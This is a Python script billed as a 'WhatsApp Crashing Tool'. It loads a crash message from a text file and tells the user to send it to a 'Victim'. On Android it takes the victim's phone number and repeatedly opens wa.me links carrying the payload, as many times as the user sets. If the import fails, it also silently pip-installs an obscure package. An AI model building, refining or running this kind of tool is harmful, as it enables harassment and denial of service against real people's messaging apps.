import os
import time
import webbrowser
try:
    import hpcomt
except ModuleNotFoundError:
    print('Module is not installed\n')
    os.system('pip install hpcomt')
print('\t\t\tWhatsApp Crashing Tool v1.1 By E4CRYTP3D')
with open('crasher.txt', 'r') as r:
    reading = r.readlines()
    conv_str = str(reading)
    crashing_text = conv_str.strip("[]'")

def whatsapp_crashingmain():
    if hpcomt.Name() == 'Windows':
        print('Please Copy this message and login to your Whatsapp account by scanning the QRCODE and send it to the Victim')
        print('NOTE: PLEASE CLOSE THE NOTEPAD AFTER COPYING THE TEXT.')
        os.system('notepad.exe crasher.txt')
        time.sleep(3)
        webbrowser.open('https://web.whatsapp.com')
    elif hpcomt.Name() == 'Linux':
        print('Please Copy this message and login to your Whatsapp account by scanning the QRCODE and send it to the Victim')
        print('NOTE: PLEASE CLOSE THE VIM Editor AFTER COPYING THE TEXT.')
        os.system('vim crasher.txt')
        time.sleep(3)
        webbrowser.open('https://web.whatsapp.com')
    elif hpcomt.Name() == 'Android':
        get_target = input("Enter the Victims Phone number with country Code=> ")
        print()
        crashing = int(input('[+] Enter the number of crashes (Max 25 per 240 Min) \n\n=> '))
        os_command = f'xdg-open https://wa.me/{get_target}/?text={crashing_text}'
        for i in range(crashing):
            print()
            print("[✓] Sending Crasher")
            os_bool = os.system(os_command)
            time.sleep(5)
            if os_bool == 0:
                print("Successful")
                pass
            else:
                print("[×] Crash Failed  ")
            time.sleep(0.4)
        return whatsapp_crashingmain()


whatsapp_crashingmain()

